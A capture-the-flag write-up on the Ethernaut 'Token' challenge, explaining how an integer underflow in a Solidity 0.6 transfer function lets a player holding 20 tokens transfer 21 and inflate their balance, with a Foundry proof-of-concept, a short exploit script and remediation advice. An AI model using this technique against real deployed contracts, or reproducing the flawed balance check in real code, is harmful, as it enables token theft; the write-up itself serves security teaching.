# Token — Security Writeup

| | |
|---|---|
| **Challenge** | [Ethernaut 05 — Token](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-token) |
| **Platform** | Smart Contracts Hacking (SCH) / OpenZeppelin Ethernaut |
| **Target** | `src/Token.sol` |
| **Solidity** | `^0.6.0` |
| **Severity** | Critical |
| **Status** | Exploited — local PoC passing |

---

## Executive summary

`Token` is a minimal ERC-20-like contract on Solidity 0.6 with a fake underflow guard:

`require(balances[msg.sender] - _value >= 0)`.

Unsigned subtraction wraps, so transferring **21** tokens while holding **20** sets the sender balance to `type(uint256).max` and still credits the recipient.

**Impact:** arbitrary self-inflation of balances; broken supply accounting.

---

## Challenge objectives

| # | Condition | How verified |
|---|-----------|--------------|
| 1 | Player balance > initial 20 | `tokenInstance.balanceOf(PLAYER) > 20` |

**Starting state:** player has **20** tokens (factory allocation).

---

## Finding

### [C-01] Unchecked underflow in `transfer`

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **Bug class** | Integer underflow / weak validation |
| **Location** | `src/Token.sol:12-16` |
| **CWE** | [CWE-191](https://cwe.mitre.org/data/definitions/191.html) — Integer Underflow |
| **SWC** | [SWC-101](https://swcregistry.io/docs/SWC-101) — Integer Overflow and Underflow |

#### Vulnerable code

```12:16:web3-ctf-challenges/05-ethernaut-token/src/Token.sol
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }
```

#### Root cause

On Solidity `< 0.8`, `uint256` math wraps. The require compares the **wrapped** result (a huge number) to `0`, so it passes. Correct pattern:

```solidity
require(balances[msg.sender] >= _value);
balances[msg.sender] -= _value;
```

#### Proof of concept

```bash
cd web3-ctf-challenges/05-ethernaut-token
forge test --match-test testExploit -vv
```

**Result:**

```
[PASS] testExploit() (gas: 74111)
```

---

## Attack scenario

| Variable | Before | After `transfer(0x0, 21)` |
|----------|--------|---------------------------|
| `balances[player]` | `20` | `2^256 - 1` |
| `balances[0x0]` | `0` | `21` |

### 7-question gate

| Step | Answer |
|------|--------|
| **1. Setup** | Hold 20 tokens |
| **2. Call** | `transfer(anyAddress, 21)` |
| **3. Result** | Player balance ≫ 20 |
| **4. Cost** | Gas only |
| **5. ROI** | Near-infinite tokens |
| **6. Privileged?** | No |
| **7. Viable?** | Yes |

---

## Exploit implementation

### SCH (`Exploit.s.sol`)

```solidity
function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    tokenInstance.transfer(address(0), 21);

    vm.stopBroadcast();
}
```

Any `_to` works; `address(0)` is fine for the CTF.

### Local test

`test/TokenExploit.t.sol` — deploys 0.6 bytecode, funds player with 20, transfers 21, asserts `type(uint256).max`.

---

## Remediation

1. Upgrade to Solidity `^0.8.0` (built-in checked math), **or**
2. Use OpenZeppelin SafeMath on 0.6, **and**
3. Always check `balances[msg.sender] >= _value` before debiting.

---

## Key lessons

1. **`uint >= 0` after subtraction is not a balance check** — compare before subtracting.
2. **Solidity version matters** — 0.6 wraps; 0.8 reverts.
3. **Fake requires hide bugs** — the line looks safe and is not.

---

## References

- [SCH Token challenge](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-token)
- [SWC-101: Integer Overflow and Underflow](https://swcregistry.io/docs/SWC-101)
- Local: `Exploit.s.sol`, `test/TokenExploit.t.sol`
